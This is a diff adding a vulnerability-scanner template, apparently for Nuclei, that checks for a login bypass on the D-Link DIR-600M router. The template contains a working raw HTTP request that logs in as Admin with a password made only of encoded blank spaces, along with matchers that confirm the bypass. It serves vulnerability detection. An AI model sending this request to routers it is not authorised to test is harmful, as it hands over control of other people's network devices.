@@ -1,0 +1,32 @@
+id: dlink-dir600m-login-bypass
+
+info:
+  name: D-Link DIR-600M Login Page Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    After successfully connecting to a D-Link DIR-600M Wireless N 150 Router (Firmware Version: 3.04),
+    any user can bypass the router's admin panel by submitting blank spaces in the password field.
+  reference:
+    - https://www.exploit-db.com/exploits/42039
+
+http:
+  - raw:
+      - |
+        POST /login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/login.htm
+        Content-Type: application/x-www-form-urlencoded
+
+        username=Admin&password=%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&submit.htm%3Flogin.htm=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "window.location.href"
+          - "index.htm"
